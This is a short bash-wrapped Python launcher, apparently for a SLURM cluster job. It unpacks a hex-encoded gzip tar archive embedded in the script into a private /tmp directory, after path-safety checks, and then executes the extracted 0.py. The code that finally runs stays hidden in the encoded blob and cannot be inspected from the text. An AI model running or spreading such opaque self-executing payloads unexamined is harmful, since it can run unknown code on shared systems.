#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172c1962282bfedac72ecbd87b6976ab5c28013b209b6807437adfadf0b76b44a5ba9b7dd6dd5790ec6d8cc3b30c300257b3be89b17857a2a4aa796feded23c2f9fdfe7ef555dd31b445f765a3327eb98f12e5fc3d75fc8b7851b1ea45eacd1a2a3a9e44dcdaa3e6bbbc5122d46763e0c4cdcdb1dcbca2a0c29fbb6699b929642e49236652d9aaeadbb3e2bf2bc627593b34c08c129cf0acaf39e95a2eb3915a265bc2964ceaf55bbb393d68b96599b55651bfe1c98be7296f625ad18ebb910b4e5bc93356b7bda35543475da49d6f2dc3b6852d1e76d9dd74d26ab36e54595b222a54d962fbebf7570ff012819cf2feee3cff59fa669f16bfd17450ef5ff1aa8e3381887ecd92ec345b0dc31bb3ba86ee983d2ab838c7a331cd1c85cf8882e83dffb6e6436a189bd216166fbe5737a97dcf24dd020a1bc6d1c9b15a6d3ed821362a4af78279f5c9c24119b4df16a34c35e72b7e2c3f178d2ca9d57fbfd599ef416272bfe194f2713be0b326efb1547cc5ae9dd5fa648e6932266b3f8749c7875b2934f426da5f5ae361baff2f32986efa247e576e8b23e328c52c72c41cc22b78e503f182491d25307a91ee9c12149343b4a12368ab3c13ac683e13b66c4fd2ea52b9cacf9a09dd227796da36c701027c84b624270509dd63dcb25640c726bc39495e8133b9ce43b630613e38fdab23e4c623c399c78c971e34339e2d56c783b064ba91d393e0865e2b963371fcc492ee593b2ee7e78987a891ffa68949397e038e213601877d3c4e49c95909090c49063a27488704c97d6997872eaff4e5be06ac1643f3c6f8523533a0a8fd824d15bef6500000000000000000000000000000000000000000000f85ff9015c1b4c9500280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
